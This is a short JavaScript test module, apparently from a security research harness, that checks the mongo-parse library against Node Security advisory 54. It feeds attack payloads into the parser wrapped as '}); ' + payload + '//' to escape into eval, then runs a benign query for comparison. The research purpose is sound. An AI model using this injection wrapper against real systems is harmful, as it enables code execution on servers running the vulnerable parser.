/**
 * Created by Cristian-Alexandru Staicu on 03.03.16.
 * Advisory 54: https://nodesecurity.io/advisories/54
 */
module.exports = function(cb) {

    var attackUtils = require("./AttackUtils.js");
    attackUtils.setup();

    var parser = require('mongo-parse');

    attackUtils.deliverPayloads(attackUtils.payloadsEval, function (payload) {
        var query = parser.parse('}); ' + payload + '//');
    }, function(result, filesWithSinks) {
        var benignInput = "{ myQueryField: x}";
        var query = parser.parse(benignInput);
        attackUtils.printCallStrings();
        result += " " + attackUtils.observedString(benignInput);
        cb(__filename, result, filesWithSinks);
    });
};
